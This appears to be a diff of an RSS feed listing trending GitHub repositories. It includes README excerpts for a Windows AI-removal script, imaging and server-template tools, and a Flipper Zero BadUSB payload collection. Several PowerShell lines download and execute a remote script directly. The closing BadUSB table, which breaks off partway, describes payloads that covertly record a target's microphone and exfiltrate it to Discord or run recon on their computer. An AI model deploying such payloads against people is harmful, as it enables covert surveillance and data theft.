+RemoveCBSPackages         
+RemoveAIFiles               
+HideAIComponents            
+DisableRewrite      
+RemoveWindowsAITasks
+UpdateCleanupCheck
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;p&gt;&lt;strong&gt;Run Install Classic Apps&lt;/strong&gt;&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;&amp;amp; ([scriptblock]::Create((irm &quot;https://raw.githubusercontent.com/zoicware/RemoveWindowsAI/main/RemoveWindowsAi.ps1&quot;))) -nonInteractive -InstallClassicApps photoviewer,mspaint,snippingtool,notepad  
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;p&gt;&lt;strong&gt;All Possible Options:&lt;/strong&gt;&lt;/p&gt; 
+&lt;pre&gt;&lt;code&gt;photoviewer          
+mspaint     
+snippingtool       
+notepad        
+photoslegacy 
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;p&gt;&lt;strong&gt;Run with Backup Mode Enabled&lt;/strong&gt;&lt;/p&gt; 
+&lt;div class=&quot;markdown-alert markdown-alert-note&quot;&gt;
+ &lt;p class=&quot;markdown-alert-title&quot;&gt;
+  &lt;svg class=&quot;octicon octicon-info mr-2&quot; viewbox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;
+   &lt;path d=&quot;M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z&quot;&gt;&lt;/path&gt;
+  &lt;/svg&gt;Note&lt;/p&gt;
+ &lt;p&gt;Backup Mode needs to be enabled to be able to fully revert&lt;/p&gt; 
+ &lt;p&gt;&lt;strong&gt;This creates a restore point for you&lt;/strong&gt;&lt;/p&gt; 
+&lt;/div&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;&amp;amp; ([scriptblock]::Create((irm &quot;https://raw.githubusercontent.com/zoicware/RemoveWindowsAI/main/RemoveWindowsAi.ps1&quot;))) -nonInteractive -backupMode -AllOptions
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;hr /&gt; 
+&lt;p&gt;&lt;strong&gt;Revert Changes&lt;/strong&gt;&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;&amp;amp; ([scriptblock]::Create((irm &quot;https://raw.githubusercontent.com/zoicware/RemoveWindowsAI/main/RemoveWindowsAi.ps1&quot;))) -nonInteractive -revertMode -AllOptions
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;hr /&gt; 
+&lt;h3&gt;Updates&lt;/h3&gt; 
+&lt;p&gt;Given that Microsoft are continually updating and adding new AI features this script will attempt to stay updated for the newest stable build.&lt;/p&gt; 
+&lt;p&gt;You can view the newest updates to the script here: &lt;a href=&quot;https://github.com/zoicware/RemoveWindowsAI/commits/main/&quot;&gt;https://github.com/zoicware/RemoveWindowsAI/commits/main/&lt;/a&gt;&lt;/p&gt; 
+&lt;div class=&quot;markdown-alert markdown-alert-note&quot;&gt;
+ &lt;p class=&quot;markdown-alert-title&quot;&gt;
+  &lt;svg class=&quot;octicon octicon-info mr-2&quot; viewbox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;
+   &lt;path d=&quot;M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z&quot;&gt;&lt;/path&gt;
+  &lt;/svg&gt;Note&lt;/p&gt;
+ &lt;p&gt;Any feature added to an Insider build will not be added to this script till it&#39;s added to the latest stable release&lt;/p&gt; 
+&lt;/div&gt; 
+&lt;div class=&quot;markdown-alert markdown-alert-tip&quot;&gt;
+ &lt;p class=&quot;markdown-alert-title&quot;&gt;
+  &lt;svg class=&quot;octicon octicon-light-bulb mr-2&quot; viewbox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;
+   &lt;path d=&quot;M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z&quot;&gt;&lt;/path&gt;
+  &lt;/svg&gt;Tip&lt;/p&gt;
+ &lt;p&gt;&lt;strong&gt;Submitting an AI Feature&lt;/strong&gt;&lt;/p&gt; 
+ &lt;p&gt;If you find an AI feature or registry key that is not currently removed or disabled by the script submit an issue with as much information as possible and I will add it to the script.&lt;/p&gt; 
+&lt;/div&gt; 
+&lt;h3&gt;Donation&lt;/h3&gt; 
+&lt;p&gt;If you would like to support my work consider donating 😃&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/zoicware&quot;&gt;&lt;img src=&quot;https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png&quot; alt=&quot;&amp;quot;Buy Me A Coffee&amp;quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
+&lt;h3&gt;Join The Discord&lt;/h3&gt; 
+&lt;p&gt;&lt;a href=&quot;https://discord.gg/VsC7XS5vgA&quot;&gt;&lt;img src=&quot;https://discordapp.com/api/guilds/1173717737017716777/widget.png?style=banner1&quot; alt=&quot;Discord&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
+&lt;h3&gt;YT Guide&lt;/h3&gt; 
+&lt;h4&gt;&lt;a href=&quot;https://youtu.be/j5_eEBWGHFw&quot;&gt;How to Remove ALL Windows AI Features&lt;/a&gt;&lt;/h4&gt;</description>
+      
+      <media:content url="https://opengraph.githubassets.com/ff3fa91b9b2c4d4c5618f6e0989f085181c294b3c8afdd0e62d207a542ee4933/zoicware/RemoveWindowsAI" medium="image" />
+      
+    </item>
+    
+    <item>
+      <title>rbalsleyMSFT/FFU</title>
+      <link>https://github.com/rbalsleyMSFT/FFU</link>
+      <description>&lt;p&gt;Using Full Flash Update files to speed up Windows Deployment&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Using Full Flash Update (FFU) files to speed up Windows deployment&lt;/h1&gt; 
+&lt;p&gt;What if you could have a Windows image (Windows 10/11/Server/LTSC) that has:&lt;/p&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;The latest Windows cumulative update&lt;/li&gt; 
+ &lt;li&gt;The latest .NET cumulative update&lt;/li&gt; 
+ &lt;li&gt;The latest Windows Defender Platform and Definition Updates&lt;/li&gt; 
+ &lt;li&gt;The latest version of Microsoft Edge&lt;/li&gt; 
+ &lt;li&gt;The latest version of OneDrive (Per-Machine)&lt;/li&gt; 
+ &lt;li&gt;The latest version of Microsoft 365 Apps/Office&lt;/li&gt; 
+ &lt;li&gt;The latest drivers from any of the major OEMs (Dell, HP, Lenovo, Microsoft) (yes, the latest, not some out of date enterprise CAB file from years ago)&lt;/li&gt; 
+ &lt;li&gt;Winget support so you can integrate any app available from Winget directly in your image&lt;/li&gt; 
+ &lt;li&gt;ARM64 support for the latest Copilot+ PCs&lt;/li&gt; 
+ &lt;li&gt;The ability to bring your own drivers and apps if necessary&lt;/li&gt; 
+ &lt;li&gt;Custom WinRE support&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;p&gt;And the best part: &lt;strong&gt;it takes less than two minutes&lt;/strong&gt; to apply the image, even with all of these updates added to the media. After setting Windows up and going through Autopilot or a provisioning package, total elapsed time ~10 minutes (depending on what Intune or your device management tool is deploying).&lt;/p&gt; 
+&lt;p&gt;The Full-Flash update (FFU) process can automatically download the latest release of Windows 11, the updates mentioned above, and creates a USB drive that can be used to quickly reimage a machine.&lt;/p&gt; 
+&lt;h1&gt;Getting Started&lt;/h1&gt; 
+&lt;p&gt;If you&#39;re new to FFU Builder or new to the FFU Builder UI version, check out the &lt;a href=&quot;https://rbalsleymsft.github.io/FFU/quickstart.html&quot;&gt;Quick Start Guide&lt;/a&gt;.&lt;/p&gt; 
+&lt;p&gt;This will be the fastest way to create your first FFU. There&#39;s a new &lt;a href=&quot;https://youtu.be/38sUc3M5Yls&quot;&gt;FFU Builder Quickstart Youtube video&lt;/a&gt; based on the 2604.1 release.&lt;/p&gt; 
+&lt;h2&gt;Older Youtube Videos&lt;/h2&gt; 
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=kOIK5OmDugc&quot;&gt;2602.1 UI Preview Quickstart Video&lt;/a&gt; - Original quickstart video without the Fluent UI.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=oozG1aVcg9M&quot;&gt;2507.1 UI Preview Video&lt;/a&gt; - First UI Preview release video. This goes deeper than the quick start video, but is missing some features that have been added since 2507.1 was released.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=rqXRbgeeKSQ&quot;&gt;2407.2 Video&lt;/a&gt; - This was the main deep-dive video on FFU Builder (before it had that name). This is a good deep dive into how the BuildFFUVM.ps1 script works, but a lot has changed since that build.&lt;/p&gt;</description>
+      
+      <media:content url="https://opengraph.githubassets.com/40c60fff00cc7192a553cc08ec8093d794544e2b04c0933c4f3baad1b21b32b5/rbalsleyMSFT/FFU" medium="image" />
+      
+    </item>
+    
+    <item>
+      <title>CubeCoders/AMPTemplates</title>
+      <link>https://github.com/CubeCoders/AMPTemplates</link>
+      <description>&lt;p&gt;For the AMP community to share Generic Module templates.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;AMP Templates&lt;/h1&gt; 
+&lt;p&gt;For the AMP community to share Generic Module templates.&lt;/p&gt; 
+&lt;h1&gt;Making generic module templates&lt;/h1&gt; 
+&lt;p&gt;See the wiki article for the module: &lt;a href=&quot;https://github.com/CubeCoders/AMP/wiki/Configuring-the-&#39;Generic&#39;-AMP-module&quot;&gt;https://github.com/CubeCoders/AMP/wiki/Configuring-the-&#39;Generic&#39;-AMP-module&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;You can also use the online configurator at &lt;a href=&quot;https://config.getamp.sh/&quot;&gt;https://config.getamp.sh/&lt;/a&gt; to help with building templates.&lt;/p&gt; 
+&lt;p&gt;*There is a much more robust version of the &lt;a href=&quot;https://iceofwraith.github.io/GenericConfigGen/&quot;&gt;online configuration tool&lt;/a&gt; that is still in beta. This should provide much better results than the above even so. If you have any feedback, please contact IceOfWraith in the CubeCoders Discord.&lt;/p&gt; 
+&lt;p&gt;&lt;strong&gt;The online configurator can be used as a starting point for making templates. However, it will not generally produce a fully functioning template. Templates produced using the generator can be deployed for personal use but will not be accepted into the CubeCoders repository.&lt;/strong&gt;&lt;/p&gt; 
+&lt;p&gt;&lt;strong&gt;AI generated configurations will not be accepted in this repo.&lt;/strong&gt;&lt;/p&gt; 
+&lt;h1&gt;Sharing Templates&lt;/h1&gt; 
+&lt;p&gt;Right now the following restrictions apply to templates that may be publicly shared via this repository (some of these will be relaxed over time):&lt;/p&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;The application must not require any login/authentication in order to download (except for SteamCMD logins).&lt;/li&gt; 
+ &lt;li&gt;If the application does not have a Linux version you should add a Proton download via SteamCMD to support it if possible.&lt;/li&gt; 
+ &lt;li&gt;Applications that have customizable settings must use a Settings Manifest.&lt;/li&gt; 
+ &lt;li&gt;Only applications that expose some kind of Console that AMP is able to pick up.&lt;/li&gt; 
+ &lt;li&gt;Do not invoke any shell scripts/batch files. You must only launch actual executables.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h1&gt;To share a template&lt;/h1&gt; 
+&lt;p&gt;Create a pull request containing the following files in the top-level directory of the repository:&lt;/p&gt; 
+&lt;pre&gt;&lt;code&gt;*APPLICATIONAME*.kvp
+*APPLICATIONAME*config.json
+*APPLICATIONAME*metaconfig.json (Optional)
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;p&gt;With the names fully lower-cased.&lt;/p&gt; 
+&lt;p&gt;For example, &lt;code&gt;valheim.kvp&lt;/code&gt;, &lt;code&gt;valheimconfig.json&lt;/code&gt;, &lt;code&gt;valheimmetaconfig.json&lt;/code&gt;&lt;/p&gt; 
+&lt;p&gt;Do not use any directories and include no-other files.&lt;/p&gt; 
+&lt;p&gt;&lt;strong&gt;If you are only submitting a draft, make sure to append (draft) to the pull request title.&lt;/strong&gt;&lt;/p&gt; 
+&lt;h1&gt;Editing templates&lt;/h1&gt; 
+&lt;p&gt;If you believe that a template needs either updating or changes made, please submit a pull request for that template with a justification for why that change is needed. If possible try and contact the original author first.&lt;/p&gt; 
+&lt;h1&gt;After submitting a template&lt;/h1&gt; 
+&lt;p&gt;Once you&#39;ve submitted a pull request, your configuration will be tested in its as-is state by an automated tool. It will:&lt;/p&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Load the configuration&lt;/li&gt; 
+ &lt;li&gt;Attempt to perform an update&lt;/li&gt; 
+ &lt;li&gt;Attempt to start the application&lt;/li&gt; 
+ &lt;li&gt;Verify that the application reaches the &#39;Ready&#39; state.&lt;/li&gt; 
+ &lt;li&gt;Attempt to stop the application&lt;/li&gt; 
+ &lt;li&gt;Verify that the application reaches the &#39;Stopped&#39; state.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;p&gt;You should ensure that your configuration can do this on both Windows and Linux before submitting your configuration.&lt;/p&gt;</description>
+      
+      <media:content url="https://opengraph.githubassets.com/ec9a69f7050873082e66c69187176a7760d4eb8ff60e18b6fc4b280c4dc0cc2b/CubeCoders/AMPTemplates" medium="image" />
+      
+    </item>
+    
+    <item>
+      <title>ScoopInstaller/Extras</title>
+      <link>https://github.com/ScoopInstaller/Extras</link>
+      <description>&lt;p&gt;📦 The Extras bucket for Scoop.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Scoop Extras &lt;a href=&quot;https://github.com/ScoopInstaller/Extras/actions/workflows/ci.yml&quot;&gt;&lt;img src=&quot;https://github.com/ScoopInstaller/Extras/actions/workflows/ci.yml/badge.svg?sanitize=true&quot; alt=&quot;Tests&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/ScoopInstaller/Extras/actions/workflows/excavator.yml&quot;&gt;&lt;img src=&quot;https://github.com/ScoopInstaller/Extras/actions/workflows/excavator.yml/badge.svg?sanitize=true&quot; alt=&quot;Excavator&quot; /&gt;&lt;/a&gt;&lt;/h1&gt; 
+&lt;p&gt;Extra manifests for &lt;a href=&quot;https://scoop.sh&quot;&gt;Scoop&lt;/a&gt;, the Windows command-line installer. For manifests that don&#39;t fit the &lt;a href=&quot;https://github.com/ScoopInstaller/Scoop/wiki/Criteria-for-including-apps-in-the-main-bucket&quot;&gt;Main criteria&lt;/a&gt;.&lt;/p&gt; 
+&lt;h2&gt;How do I install these manifests?&lt;/h2&gt; 
+&lt;p&gt;To add this bucket, run &lt;code&gt;scoop bucket add extras&lt;/code&gt;. To install, do &lt;code&gt;scoop install &amp;lt;manifest&amp;gt;&lt;/code&gt;.&lt;/p&gt; 
+&lt;h2&gt;How do I contribute new manifests?&lt;/h2&gt; 
+&lt;p&gt;To make a new manifest contribution, please read the &lt;a href=&quot;https://github.com/ScoopInstaller/.github/raw/main/.github/CONTRIBUTING.md&quot;&gt;Contributing Guide&lt;/a&gt;.&lt;/p&gt;</description>
+      
+      <media:content url="https://repository-images.githubusercontent.com/11914939/fcccb3a5-0410-4239-bc62-0ed6a1880fbc" medium="image" />
+      
+    </item>
+    
+    <item>
+      <title>OrcaSlicer/OrcaSlicer_WIKI</title>
+      <link>https://github.com/OrcaSlicer/OrcaSlicer_WIKI</link>
+      <description>&lt;p&gt;The official wiki repository for OrcaSlicer&lt;/p&gt;&lt;hr&gt;&lt;div align=&quot;center&quot;&gt; 
+ &lt;img alt=&quot;OrcaSlicer&quot; src=&quot;https://github.com/OrcaSlicer/OrcaSlicer/raw/main/resources/images/OrcaSlicer.png?raw=true&quot; width=&quot;15%&quot; height=&quot;15%&quot; /&gt; 
+ &lt;h1&gt;OrcaSlicer Wiki&lt;/h1&gt; 
+ &lt;p&gt;&lt;a href=&quot;https://github.com/OrcaSlicer/OrcaSlicer_WIKI/stargazers&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/stars/OrcaSlicer/OrcaSlicer_WIKI&quot; alt=&quot;GitHub Repo stars&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/OrcaSlicer/OrcaSlicer_WIKI/actions/workflows/publish_docs_to_wiki.yml&quot;&gt;&lt;img src=&quot;https://github.com/OrcaSlicer/OrcaSlicer_WIKI/actions/workflows/publish_docs_to_wiki.yml/badge.svg?sanitize=true&quot; alt=&quot;Publish docs to Wiki&quot; /&gt;&lt;/a&gt;&lt;a href=&quot;https://github.com/OrcaSlicer/OrcaSlicer_WIKI/actions/workflows/validate_tab_links.yml&quot;&gt;&lt;img src=&quot;https://github.com/OrcaSlicer/OrcaSlicer_WIKI/actions/workflows/validate_tab_links.yml/badge.svg?sanitize=true&quot; alt=&quot;Validate Tab Links&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
+&lt;/div&gt; 
+&lt;p&gt;This is the official Wiki Repository for &lt;a href=&quot;https://github.com/OrcaSlicer/OrcaSlicer&quot;&gt;OrcaSlicer&lt;/a&gt;.&lt;/p&gt; 
+&lt;p&gt;Documents in this repository are the source files for the &lt;a href=&quot;https://www.orcaslicer.com/wiki/&quot;&gt;OrcaSlicer Wiki&lt;/a&gt; and are automatically synchronized with the &lt;a href=&quot;https://github.com/OrcaSlicer/OrcaSlicer/wiki&quot;&gt;OrcaSlicer Github Wiki&lt;/a&gt;.&lt;/p&gt; 
+&lt;p&gt;How to contribute to the wiki guide: &lt;strong&gt;&lt;a href=&quot;https://github.com/OrcaSlicer/OrcaSlicer/wiki/how_to_wiki&quot;&gt;How-to-wiki&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; 
+&lt;p&gt;Please Note that this wiki is a work in progress. We appreciate your patience as we continue to develop and improve it!&lt;/p&gt; 
+&lt;h2&gt;Official links and community&lt;/h2&gt; 
+&lt;h3&gt;Official Website&lt;/h3&gt; 
+&lt;p&gt;&lt;a href=&quot;https://www.orcaslicer.com/&quot; style=&quot;font-size:2em;&quot;&gt;OrcaSlicer.com&lt;/a&gt;&lt;/p&gt; 
+&lt;h3&gt;OrcaSlicer Repository&lt;/h3&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/OrcaSlicer/OrcaSlicer&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/OrcaSlicer-181717?style=flat&amp;amp;logo=github&amp;amp;logoColor=white&quot; width=&quot;200&quot; alt=&quot;GitHub Logo&quot; /&gt; &lt;/a&gt;&lt;/p&gt; 
+&lt;h3&gt;Wiki Repository&lt;/h3&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/OrcaSlicer/OrcaSlicer_WIKI&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/OrcaSlicer_Wiki-181717?style=flat&amp;amp;logo=github&amp;amp;logoColor=white&quot; width=&quot;200&quot; alt=&quot;GitHub Logo&quot; /&gt; &lt;/a&gt;&lt;/p&gt; 
+&lt;h3&gt;Follow us&lt;/h3&gt; 
+&lt;p&gt;&lt;a href=&quot;https://twitter.com/real_OrcaSlicer&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/real__OrcaSlicer-000000?style=flat&amp;amp;logo=x&amp;amp;logoColor=white&quot; width=&quot;200&quot; alt=&quot;X Logo&quot; /&gt; &lt;/a&gt;&lt;br /&gt; &lt;a href=&quot;https://www.youtube.com/@OfficialOrcaSlicer&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/OfficialOrcaSlicer-FF0000?style=flat&amp;amp;logo=youtube&amp;amp;logoColor=white&quot; width=&quot;200&quot; alt=&quot;YouTube Logo&quot; /&gt; &lt;/a&gt;&lt;/p&gt; 
+&lt;h3&gt;Join our Discord community&lt;/h3&gt; 
+&lt;p&gt;&lt;a href=&quot;https://discord.gg/P4VE9UY9gJ&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/-Discord-5865F2?style=flat&amp;amp;logo=discord&amp;amp;logoColor=fff&quot; width=&quot;200&quot; alt=&quot;discord logo&quot; /&gt; &lt;/a&gt;&lt;/p&gt;</description>
+      
+      <media:content url="https://opengraph.githubassets.com/92a559ddd938840acf3fffb277fb42dcffe98c6589f47b0565a8c8f46f941243/OrcaSlicer/OrcaSlicer_WIKI" medium="image" />
+      
+    </item>
+    
+    <item>
+      <title>I-Am-Jakoby/Flipper-Zero-BadUSB</title>
+      <link>https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB</link>
+      <description>&lt;p&gt;Repository for my flipper zero badUSB payloads. Now almost entirely plug and play.&lt;/p&gt;&lt;hr&gt;&lt;div align=&quot;center&quot;&gt; 
+ &lt;h1&gt;💀 BadUSB 💀&lt;/h1&gt; 
+ &lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://github.com/sponsors/I-Am-Jakoby&quot;&gt; &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/Discord-Sponsor.png&quot; width=&quot;125&quot; alt=&quot;Python&quot; /&gt; &lt;/a&gt; &lt;/p&gt; 
+ &lt;p&gt;Subscribing to my YouTube would also be greatly appreciated.&lt;/p&gt; 
+ &lt;p&gt;&lt;a href=&quot;https://jakoby.lol/yno&quot;&gt;&lt;img src=&quot;https://custom-icon-badges.herokuapp.com/badge/-Subscribe-red?style=for-the-badge&amp;amp;logo=video&amp;amp;logoColor=white&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
+ &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/disclaimer.png&quot; width=&quot;600&quot; alt=&quot;C#&quot; /&gt; 
+&lt;/div&gt; 
+&lt;h1&gt;Table of Contents&lt;/h1&gt; 
+&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/#Description&quot;&gt;Description&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/#The-Payloads&quot;&gt;The Payloads&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/#Contact&quot;&gt;Contact&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/#Acknowledgments&quot;&gt;Acknowledgments&lt;/a&gt;&lt;/p&gt; 
+&lt;h1&gt;Unleash the power of your Flipper 🤓💻&lt;/h1&gt; 
+&lt;hr /&gt; 
+&lt;h2&gt;Description&lt;/h2&gt; 
+&lt;p&gt;🥇 I am in 1st place for most payloads submitted to Hak5❗&lt;/p&gt; 
+&lt;p&gt;🔓 I have taken my colllection of payloads and formatted them to work for the Flipper for all of you to use❗&lt;/p&gt; 
+&lt;p&gt;⚠️ Please ENJOY and use RESPONSIBLY❗&lt;/p&gt; 
+&lt;p&gt;&lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/hak5-banner.png&quot; alt=&quot;hak 5&quot; /&gt;&lt;/p&gt; 
+&lt;h2&gt;The Payloads&lt;/h2&gt; 
+&lt;p&gt;This repository has been optimized to facilitate plug and play functionality.&lt;/p&gt; 
+&lt;p&gt;I purchased the domain &lt;code&gt;jakoby.lol&lt;/code&gt; for the sole purpose of creating my own short URLs.&lt;/p&gt; 
+&lt;p&gt;I did this with the intention of making room for Discord webhooks and Dropbox tokens to fit in my one-liners.&lt;/p&gt; 
+&lt;p&gt;This, in turn, makes it so the user no longer needs to host their own version of the script.&lt;/p&gt; 
+&lt;table&gt; 
+ &lt;thead&gt; 
+  &lt;tr&gt; 
+   &lt;th style=&quot;text-align:left&quot;&gt;Payloads&lt;/th&gt; 
+   &lt;th style=&quot;text-align:left&quot;&gt;Description&lt;/th&gt; 
+   &lt;th style=&quot;text-align:left&quot;&gt;Plug&#39;n&#39;Play&lt;/th&gt; 
+   &lt;th style=&quot;text-align:left&quot;&gt;Author&lt;/th&gt; 
+  &lt;/tr&gt; 
+ &lt;/thead&gt; 
+ &lt;tbody&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/VoiceLogger&quot;&gt;VoiceLogger&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Activates your target&#39;s microphone, converts their speech to text, and exfils it to Discord.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-EvilGoose&quot;&gt;Evil-Goose&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;A payload that hires a goose to hack your target in real time.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-ADV-Recon&quot;&gt;ADV-Recon&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;A script used to do an advanced level of recon on the target&#39;s computer.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-AcidBurn&quot;&gt;AcidBurn&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;A script I put together to be used on your friends or foes. Prepare to be roasted.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-JumpScare&quot;&gt;Jump-Scare&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Just a little jumpscare that changes the target&#39;s wallpaper.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-JumpScare-2.0&quot;&gt;Jump-Scare V2&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Just a little jumpscare that plays a video in the target&#39;s PowerShell console.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-ADV-RickRoll&quot;&gt;ADV-RickRoll&lt;/a&gt;&lt;/td&gt; 
